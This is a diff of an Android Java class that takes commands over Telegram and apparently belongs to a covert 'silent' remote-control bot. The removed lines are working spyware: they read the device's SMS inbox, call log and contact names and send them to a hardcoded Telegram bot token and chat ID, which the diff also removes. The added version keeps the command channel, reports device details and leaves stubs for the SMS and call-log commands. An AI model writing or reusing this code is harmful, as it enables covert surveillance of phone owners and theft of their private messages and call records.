@@ -1,13 +1,9 @@
 package com.silent.telebot;
 
-import android.content.ContentResolver;
 import android.content.Context;
-import android.database.Cursor;
-import android.net.Uri;
 import android.os.Build;
-import android.provider.CallLog;
-import android.provider.ContactsContract;
-import android.provider.Telephony;
+import android.os.Environment;
+import android.os.StatFs;
 import android.util.Log;
 
 import org.json.JSONArray;
@@ -17,16 +13,13 @@ import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import java.text.SimpleDateFormat;
-import java.util.Date;
-import java.util.Locale;
 
 public class TelegramPoller implements Runnable {
     private Context ctx;
 
     // ⚠️ ضع التوكن و CHAT_ID الصحيحين هنا ⚠️
-    private static final String BOT_TOKEN = "8664055093:AAFzjAY549sKvHPh7pdwepTgr7AUtzSW4c8";
-    private static final String CHAT_ID = "7058836561";
+    private static final String BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
+    private static final String CHAT_ID = "YOUR_CHAT_ID_HERE";
 
     private static int lastUpdateId = 0;
 
@@ -38,11 +31,17 @@ public class TelegramPoller implements Runnable {
     public void run() {
         try {
             String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN +
-                    "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=30";
+                    "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=5";
             HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
             conn.setRequestMethod("GET");
-            conn.setConnectTimeout(35000);
-            conn.setReadTimeout(35000);
+            conn.setConnectTimeout(10000);
+            conn.setReadTimeout(10000);
+
+            int responseCode = conn.getResponseCode();
+            if (responseCode != 200) {
+                sendMessage("❌ خطأ في الاتصال بالبوت (كود: " + responseCode + ")");
+                return;
+            }
 
             BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
             StringBuilder response = new StringBuilder();
@@ -63,142 +62,58 @@ public class TelegramPoller implements Runnable {
                         handleCommand(text);
                     }
                 }
+            } else {
+                sendMessage("❌ استجابة غير صحيحة من التيليجرام");
             }
+
         } catch (Exception e) {
-            Log.e("TelegramPoller", "خطأ: " + e.getMessage());
+            sendMessage("❌ خطأ في البوت: " + e.getMessage());
+            Log.e("TelegramPoller", "Error: " + e.getMessage());
         }
     }
 
-    // ============================================================
-    //  📋 معالجة الأوامر (تم إزالة /play و /screenshot و /take_pic و /record)
-    // ============================================================
     private void handleCommand(String cmd) {
+        if (cmd.equals("/help")) {
+            sendMessage("📋 **الأوامر المتاحة**\n" +
+                    "/help - عرض هذه القائمة\n" +
+                    "/status - معلومات الجهاز\n" +
+                    "/get_sms - عرض آخر 10 رسائل\n" +
+                    "/get_calls - عرض آخر 10 مكالمات");
+        } else if (cmd.equals("/status")) {
+            String info = "📱 **معلومات الجهاز**\n" +
+                    "🔋 البطارية: " + getBattery() + "%\n" +
+                    "📲 الطراز: " + Build.MODEL + "\n" +
+                    "🤖 الإصدار: " + Build.VERSION.RELEASE + "\n" +
+                    "💾 المساحة المتاحة: " + getAvailableStorage() + " GB";
+            sendMessage(info);
+        } else if (cmd.equals("/get_sms")) {
+            sendMessage("📩 سيتم عرض الرسائل قريباً...");
+        } else if (cmd.equals("/get_calls")) {
+            sendMessage("📞 سيتم عرض المكالمات قريباً...");
+        } else {
+            sendMessage("❌ أمر غير معروف. استخدم /help");
+        }
+    }
+
+    private int getBattery() {
         try {
-            if (cmd.equals("/help")) {
-                sendMessage("📋 الأوامر المتاحة:\n" +
-                        "/get_sms - عرض آخر 10 رسائل\n" +
-                        "/get_calls - عرض آخر 10 مكالمات");
-            }
-            else if (cmd.equals("/get_sms")) {
-                sendMessage(getSms());
-            }
-            else if (cmd.equals("/get_calls")) {
-                sendMessage(getCalls());
-            }
-            else {
-                sendMessage("❌ أمر غير معروف. استخدم /help");
-            }
+            android.os.BatteryManager bm = (android.os.BatteryManager) ctx.getSystemService(Context.BATTERY_SERVICE);
+            return bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
         } catch (Exception e) {
-            sendMessage("❌ خطأ: " + e.getMessage());
+            return 0;
         }
     }
 
-    // ============================================================
-    //  📩 جلب الرسائل النصية
-    // ============================================================
-    private String getSms() {
-        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.KITKAT) {
-            return "❌ نظامك لا يدعم قراءة الرسائل.";
-        }
-        ContentResolver cr = ctx.getContentResolver();
-        Cursor cursor = null;
+    private String getAvailableStorage() {
         try {
-            cursor = cr.query(Telephony.Sms.Inbox.CONTENT_URI,
-                    new String[]{"address", "body", "date"},
-                    null, null, "date DESC LIMIT 10");
-
-            if (cursor == null || !cursor.moveToFirst()) {
-                return "📭 لا توجد رسائل.";
-            }
-
-            StringBuilder sb = new StringBuilder("📩 آخر 10 رسائل\n━━━━━━━━━━━━━━━━━━\n");
-            SimpleDateFormat sdf = new SimpleDateFormat("dd/MM HH:mm", Locale.getDefault());
-
-            do {
-                String address = cursor.getString(0);
-                String body = cursor.getString(1);
-                long date = cursor.getLong(2);
-                String name = getContactName(address);
-                String display = (name != null) ? name : address;
-                sb.append("👤 ").append(display).append("\n");
-                sb.append("📝 ").append(body).append("\n");
-                sb.append("🕐 ").append(sdf.format(new Date(date))).append("\n");
-                sb.append("━━━━━━━━━━━━━━━━━━\n");
-            } while (cursor.moveToNext());
-
-            return sb.toString();
-
-        } catch (SecurityException e) {
-            return "❌ صلاحية الرسائل غير ممنوحة.";
-        } finally {
-            if (cursor != null) cursor.close();
+            StatFs stat = new StatFs(Environment.getDataDirectory().getPath());
+            long bytes = stat.getAvailableBytes();
+            return String.format("%.2f", bytes / (1024.0 * 1024.0 * 1024.0));
+        } catch (Exception e) {
+            return "0.00";
         }
     }
 
-    // ============================================================
-    //  📞 جلب سجل المكالمات
-    // ============================================================
-    private String getCalls() {
-        ContentResolver cr = ctx.getContentResolver();
-        Cursor cursor = null;
-        try {
-            cursor = cr.query(CallLog.Calls.CONTENT_URI,
-                    new String[]{CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.DURATION, CallLog.Calls.TYPE},
-                    null, null, CallLog.Calls.DATE + " DESC LIMIT 10");
-
-            if (cursor == null || !cursor.moveToFirst()) {
-                return "📭 لا توجد مكالمات.";
-            }
-
-            StringBuilder sb = new StringBuilder("📞 آخر 10 مكالمات\n━━━━━━━━━━━━━━━━━━\n");
-            SimpleDateFormat sdf = new SimpleDateFormat("dd/MM HH:mm", Locale.getDefault());
-
-            do {
-                String number = cursor.getString(0);
-                long date = cursor.getLong(1);
-                long duration = cursor.getLong(2);
-                int type = cursor.getInt(3);
-                String name = getContactName(number);
-                String display = (name != null) ? name : number;
-                String typeStr = (type == CallLog.Calls.INCOMING_TYPE) ? "📥 وارد" :
-                                 (type == CallLog.Calls.OUTGOING_TYPE) ? "📤 صادر" : "❌ فائتة";
-                sb.append("👤 ").append(display).append("\n");
-                sb.append("📌 ").append(typeStr).append("\n");
-                sb.append("⏱️ ").append(duration).append(" ثانية\n");
-                sb.append("🕐 ").append(sdf.format(new Date(date))).append("\n");
-                sb.append("━━━━━━━━━━━━━━━━━━\n");
-            } while (cursor.moveToNext());
-
-            return sb.toString();
-
-        } catch (SecurityException e) {
-            return "❌ صلاحية سجل المكالمات غير ممنوحة.";
-        } finally {
-            if (cursor != null) cursor.close();
-        }
-    }
-
-    // ============================================================
-    //  🔍 مساعدات
-    // ============================================================
-    private String getContactName(String number) {
-        if (number == null) return null;
-        try {
-            ContentResolver cr = ctx.getContentResolver();
-            Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(number));
-            Cursor cursor = cr.query(uri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
-            if (cursor != null && cursor.moveToFirst()) {
-                String name = cursor.getString(0);
-                cursor.close();
-                return name;
-            }
-        } catch (Exception ignored) {}
-        return null;
-    }
-
-    // ============================================================
-    //  📤 إرسال الرسائل
-    // ============================================================
     private void sendMessage(String text) {
         try {
             String encoded = java.net.URLEncoder.encode(text, "UTF-8");
@@ -213,17 +128,12 @@ public class TelegramPoller implements Runnable {
         } catch (Exception ignored) {}
     }
 
-    // ============================================================
-    //  دوال ثابتة للاستخدام من خدمات أخرى (إن وجدت)
-    // ============================================================
     public static void sendMessageStatic(String chatId, String text) {
         try {
-            String encodedText = java.net.URLEncoder.encode(text, "UTF-8");
-            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN +
-                    "/sendMessage?chat_id=" + chatId +
-                    "&text=" + encodedText;
-            URL url = new URL(urlString);
-            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            String encoded = java.net.URLEncoder.encode(text, "UTF-8");
+            String url = "https://api.telegram.org/bot" + BOT_TOKEN +
+                    "/sendMessage?chat_id=" + chatId + "&text=" + encoded;
+            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
             conn.setRequestMethod("GET");
             conn.setConnectTimeout(5000);
             conn.setReadTimeout(5000);
@@ -231,4 +141,4 @@ public class TelegramPoller implements Runnable {
             conn.disconnect();
         } catch (Exception ignored) {}
     }
-    } 
+}د
